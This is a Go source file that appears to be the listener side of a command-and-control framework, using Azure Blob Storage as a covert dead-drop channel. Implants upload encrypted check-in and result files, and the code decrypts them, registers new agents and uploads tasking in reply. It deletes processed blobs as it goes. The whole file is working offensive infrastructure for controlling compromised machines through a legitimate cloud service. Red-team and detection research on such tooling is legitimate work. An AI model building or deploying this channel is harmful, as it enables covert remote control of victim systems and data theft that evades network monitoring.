package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/xml"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

type TransportGraph struct {
	Name   string
	Config TransportConfig
	Active bool

	stopCh chan struct{}
	wg     sync.WaitGroup

	blobSAS       string
	blobSASExpiry time.Time

	client *http.Client
}

type graphDriveItem struct {
	ID   string `json:"id"`
	Name string `json:"name"`
	Size int64  `json:"size"`
}

type blobListResult struct {
	Blobs struct {
		BlobList []blobItem `xml:"Blob"`
	} `xml:"Blobs"`
}

type blobItem struct {
	Name string `xml:"Name"`
}

func NewTransportGraph(name string, config TransportConfig) *TransportGraph {
	return &TransportGraph{
		Name:   name,
		Config: config,
		client: &http.Client{Timeout: 30 * time.Second},
	}
}

// ===== Start / Stop =====

func (t *TransportGraph) Start() error {
	t.stopCh = make(chan struct{})
	t.Active = true

	if err := t.blobRefreshSAS(); err != nil {
		return fmt.Errorf("blob sas generation failed: %w", err)
	}
	if err := t.blobEnsureContainer(); err != nil {
		return fmt.Errorf("blob container creation failed: %w", err)
	}

	// Clean up stale blobs from previous sessions
	if files, err := t.listFiles(); err == nil {
		for _, f := range files {
			if strings.HasSuffix(f.Name, ".dat") {
				_ = t.deleteFile(f.Name)
			}
		}
	}

	t.wg.Add(1)
	go t.pollLoop()
	return nil
}

func (t *TransportGraph) Stop() error {
	if t.stopCh != nil {
		close(t.stopCh)
	}
	t.wg.Wait()
	t.Active = false
	return nil
}

func (t *TransportGraph) listFiles() ([]graphDriveItem, error) {
	return t.blobListFiles()
}

func (t *TransportGraph) downloadFile(filename string) ([]byte, error) {
	return t.blobDownloadFile(filename)
}

func (t *TransportGraph) uploadFile(filename string, data []byte) error {
	return t.blobUploadFile(filename, data)
}

func (t *TransportGraph) deleteFile(filename string) error {
	return t.blobDeleteFile(filename)
}

// ===== Azure Blob Storage =====

func (t *TransportGraph) blobRefreshSAS() error {
	sas, err := generateAccountSAS(t.Config.StorageAccount, t.Config.StorageKey, time.Now().Add(24*time.Hour))
	if err != nil {
		return err
	}
	t.blobSAS = sas
	t.blobSASExpiry = time.Now().Add(23 * time.Hour)
	return nil
}

func (t *TransportGraph) getBlobSAS() (string, error) {
	if t.blobSAS != "" && time.Now().Before(t.blobSASExpiry) {
		return t.blobSAS, nil
	}
	return t.blobSAS, t.blobRefreshSAS()
}

func (t *TransportGraph) blobBaseURL() string {
	return fmt.Sprintf("https://%s.blob.core.windows.net", t.Config.StorageAccount)
}

func (t *TransportGraph) doBlobAPI(method, pathAndQuery string, body []byte, extraHeaders map[string]string) ([]byte, int, error) {
	sas, err := t.getBlobSAS()
	if err != nil {
		return nil, 0, err
	}
	sep := "?"
	if strings.Contains(pathAndQuery, "?") {
		sep = "&"
	}
	fullURL := t.blobBaseURL() + pathAndQuery + sep + sas
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, fullURL, bodyReader)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("x-ms-version", "2020-10-02")
	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}
	maxRetries := 2
	for attempt := 0; attempt < maxRetries; attempt++ {
		resp, err := t.client.Do(req)
		if err != nil {
			return nil, 0, err
		}
		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 429 || resp.StatusCode == 503 {
			if attempt < maxRetries-1 {
				sleepSec := 60
				if ra := resp.Header.Get("Retry-After"); ra != "" {
					if s, err2 := strconv.Atoi(ra); err2 == nil && s > 0 && s < 300 {
						sleepSec = s
					}
				}
				select {
				case <-t.stopCh:
					return nil, 0, errors.New("transport stopped during throttle wait")
				case <-time.After(time.Duration(sleepSec) * time.Second):
				}
				if body != nil {
					bodyReader = bytes.NewReader(body)
				}
				req, _ = http.NewRequest(method, fullURL, bodyReader)
				req.Header.Set("x-ms-version", "2020-10-02")
				for k, v := range extraHeaders {
					req.Header.Set(k, v)
				}
				continue
			}
		}
		return respBody, resp.StatusCode, nil
	}
	return nil, 0, errors.New("exhausted retries")
}

func (t *TransportGraph) blobEnsureContainer() error {
	path := fmt.Sprintf("/%s?restype=container", t.Config.ContainerName)
	_, status, err := t.doBlobAPI("PUT", path, nil, nil)
	if err != nil {
		return err
	}
	if status != 201 && status != 409 {
		return fmt.Errorf("create container returned %d", status)
	}
	return nil
}

func (t *TransportGraph) blobListFiles() ([]graphDriveItem, error) {
	path := fmt.Sprintf("/%s?restype=container&comp=list", t.Config.ContainerName)
	body, status, err := t.doBlobAPI("GET", path, nil, nil)
	if err != nil {
		return nil, err
	}
	if status != 200 {
		return nil, fmt.Errorf("blob list returned %d", status)
	}
	var result blobListResult
	if err := xml.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("blob list xml parse: %w", err)
	}
	var items []graphDriveItem
	for _, b := range result.Blobs.BlobList {
		items = append(items, graphDriveItem{Name: b.Name})
	}
	return items, nil
}

func (t *TransportGraph) blobDownloadFile(filename string) ([]byte, error) {
	path := fmt.Sprintf("/%s/%s", t.Config.ContainerName, url.PathEscape(filename))
	body, status, err := t.doBlobAPI("GET", path, nil, nil)
	if err != nil {
		return nil, err
	}
	if status == 404 {
		return nil, fmt.Errorf("blob %s not found", filename)
	}
	if status != 200 {
		return nil, fmt.Errorf("blob download %s returned %d", filename, status)
	}
	return body, nil
}

func (t *TransportGraph) blobUploadFile(filename string, data []byte) error {
	path := fmt.Sprintf("/%s/%s", t.Config.ContainerName, url.PathEscape(filename))
	headers := map[string]string{"x-ms-blob-type": "BlockBlob"}
	_, status, err := t.doBlobAPI("PUT", path, data, headers)
	if err != nil {
		return err
	}
	if status != 201 && status != 200 {
		return fmt.Errorf("blob upload %s returned %d", filename, status)
	}
	return nil
}

func (t *TransportGraph) blobDeleteFile(filename string) error {
	path := fmt.Sprintf("/%s/%s", t.Config.ContainerName, url.PathEscape(filename))
	_, status, err := t.doBlobAPI("DELETE", path, nil, nil)
	if err != nil {
		return err
	}
	if status != 202 && status != 200 && status != 404 {
		return fmt.Errorf("blob delete %s returned %d", filename, status)
	}
	return nil
}

// ===== Poll loop =====

// hasSeqSuffix returns true if the filename has the _NNNNNNNN.dat suffix
// that agent-uploaded results carry. Listener-generated r_*.dat have no suffix.
func hasSeqSuffix(name string) bool {
	// Format: r_<16hex>_<8digits>.dat
	name = strings.TrimSuffix(name, ".dat")
	parts := strings.Split(name, "_")
	if len(parts) < 3 {
		return false
	}
	last := parts[len(parts)-1]
	if len(last) != 8 {
		return false
	}
	for _, c := range last {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// extractSeq extracts the sequence number from r_<nonce>_<seq>.dat filenames.
// Returns 0 for legacy filenames without sequence suffix.
func extractSeq(name string) uint64 {
	// Format: r_<16hex>_<8digits>.dat
	name = strings.TrimSuffix(name, ".dat")
	parts := strings.Split(name, "_")
	if len(parts) < 3 {
		return 0
	}
	var seq uint64
	fmt.Sscanf(parts[len(parts)-1], "%d", &seq)
	return seq
}

// processAgentResult handles r_*.dat files uploaded by the agent as command results.
// Format: [agentCrc(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))]
// Files uploaded by the listener (NO_TASKS responses) are only 32 bytes and
// will not match the minimum size — they are ignored automatically.
func (t *TransportGraph) processAgentResult(filename string) {
	data, err := t.downloadFile(filename)
	if err != nil || len(data) < 24 {
		// Too small to be an agent result — listener-uploaded NO_TASKS frame
		_ = t.deleteFile(filename)
		return
	}
	// Verify agentCrc matches our watermark before attempting decrypt
	crc := fmt.Sprintf("%08x", binary.BigEndian.Uint32(data[:4]))
	if crc != t.Config.AgentCrc {
		// Not from our agent — stale file or listener response, delete it
		_ = t.deleteFile(filename)
		return
	}
	// Parse same format as c_*.dat
	_, agentUID, ciphertext, _, _, err := t.parseBeatAndData(data)
	if err != nil {
		_ = t.deleteFile(filename)
		return
	}
	agentId, exists := Ts.TsAgentIdByUID(agentUID)
	if !exists {
		_ = t.deleteFile(filename)
		return
	}
	_ = Ts.TsAgentProcessData(agentId, ciphertext)
	_ = t.deleteFile(filename)
}

func (t *TransportGraph) pollLoop() {
	defer t.wg.Done()
	interval := time.Duration(t.Config.PollInterval) * time.Second
	if interval < time.Second {
		interval = 5 * time.Second
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-t.stopCh:
			return
		case <-ticker.C:
			t.processCheckins()
		}
	}
}

func (t *TransportGraph) processCheckins() {
	files, err := t.listFiles()
	if err != nil {
		return
	}
	// Separate r_*.dat and c_*.dat
	var rFiles []graphDriveItem
	var cFiles []graphDriveItem
	for _, f := range files {
		if !strings.HasSuffix(f.Name, ".dat") {
			continue
		}
		if strings.HasPrefix(f.Name, "r_") {
			// Only process agent-uploaded results — they have _NNNNNNNN suffix
			// r_*.dat without suffix are listener-generated responses for the agent
			if hasSeqSuffix(f.Name) {
				rFiles = append(rFiles, f)
			}
		} else if strings.HasPrefix(f.Name, "c_") {
			cFiles = append(cFiles, f)
		}
	}
	// Sort r_*.dat by sequence suffix and process in strict order
	if len(rFiles) > 0 {
		sort.Slice(rFiles, func(i, j int) bool {
			return extractSeq(rFiles[i].Name) < extractSeq(rFiles[j].Name)
		})
		for _, f := range rFiles {
			t.processAgentResult(f.Name)
		}
	}
	for _, f := range cFiles {
		select {
		case <-t.stopCh:
			return
		default:
		}
		data, err := t.downloadFile(f.Name)
		if err != nil {
			continue
		}
		nonce := strings.TrimSuffix(strings.TrimPrefix(f.Name, "c_"), ".dat")
		agentCrc, agentUID, ciphertext, frame, bodyData, err := t.parseBeatAndData(data)
		if err != nil {
			_ = t.deleteFile(f.Name)
			continue
		}
		// v2 API: resolve by UID bytes
		agentId, exists := Ts.TsAgentIdByUID(agentUID)
		if !exists {
			// beatWithId: [agentUID(16)][aesKey(16)][ciphertext]
			// pl_agent.go CreateAgent decrypts beatWithId[32:] to get the frame
			encKey, _ := hex.DecodeString(t.Config.EncryptKey)
			beatWithId := make([]byte, 16+16+len(ciphertext))
			copy(beatWithId[:16], agentUID)
			copy(beatWithId[16:32], encKey)
			copy(beatWithId[32:], ciphertext)
			agentData, err := Ts.TsAgentCreate(agentCrc, agentUID, beatWithId, t.Name, "graph-api", true)
			if err != nil {
				_ = t.deleteFile(f.Name)
				continue
			}
			agentId = agentData.Id
		} else {
			// Existing agent — process the decrypted frame directly
			_ = Ts.TsAgentSetTick(agentId, t.Name)
			_ = Ts.TsAgentProcessData(agentId, frame)
			if len(bodyData) > 0 {
				_ = Ts.TsAgentProcessData(agentId, bodyData)
			}
		}

		respFilename := fmt.Sprintf("r_%s.dat", nonce)
		responseData, _, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000)
		if err == nil && len(responseData) > 0 {
			if uploadErr := t.uploadFile(respFilename, responseData); uploadErr != nil {
				fmt.Printf("[NAX-Graph] upload response failed for %s: %v\n", respFilename, uploadErr)
			}
		} else {
			// Always respond so the agent doesn't poll until timeout
			noTasksFrame := []byte{0x80, 0x00, 0x00, 0x00, 0x00, 0x00}
			enc, encErr := EncryptCBCRandomIV(mustDecodeHex(t.Config.EncryptKey), noTasksFrame)
			if encErr != nil {
				fmt.Printf("[NAX-Graph] encrypt noTasksFrame failed: %v\n", encErr)
			} else if uploadErr := t.uploadFile(respFilename, enc); uploadErr != nil {
				fmt.Printf("[NAX-Graph] upload noTasksFrame failed for %s: %v\n", respFilename, uploadErr)
			}
		}
		_ = t.deleteFile(f.Name)
	}
}

// parseBeatAndData parses: [agentCrc(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))][bodyData]
// agentCrc and agentUID are in clear; frame is AES-CBC encrypted.
// Returns: agentCrc, agentUID, ciphertext(frame only), frame(plaintext), bodyData
func (t *TransportGraph) parseBeatAndData(fileData []byte) (string, []byte, []byte, []byte, []byte, error) {
	if len(fileData) < 24 {
		return "", nil, nil, nil, nil, errors.New("file too small")
	}

	agentCrc := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fileData[:4]))
	agentUID := fileData[4:20]
	encLen   := binary.BigEndian.Uint32(fileData[20:24])
	if uint32(len(fileData)) < 24+encLen {
		return "", nil, nil, nil, nil, errors.New("truncated beat data")
	}
	beatB64  := fileData[24 : 24+encLen]
	bodyData := fileData[24+encLen:]

	ciphertext, err := base64.StdEncoding.DecodeString(string(beatB64))
	if err != nil || len(ciphertext) == 0 {
		return "", nil, nil, nil, nil, errors.New("failed to decode beat")
	}

	// Decrypt — plaintext is the frame directly (no agentCrc/agentUID prefix)
	frame, err := DecryptCBC(mustDecodeHex(t.Config.EncryptKey), ciphertext)
	if err != nil || len(frame) < 6 {
		return "", nil, nil, nil, nil, fmt.Errorf("beat decrypt failed: %w", err)
	}

	return agentCrc, agentUID, ciphertext, frame, bodyData, nil
}

func mustDecodeHex(s string) []byte {
	b, _ := hex.DecodeString(s)
	return b
}
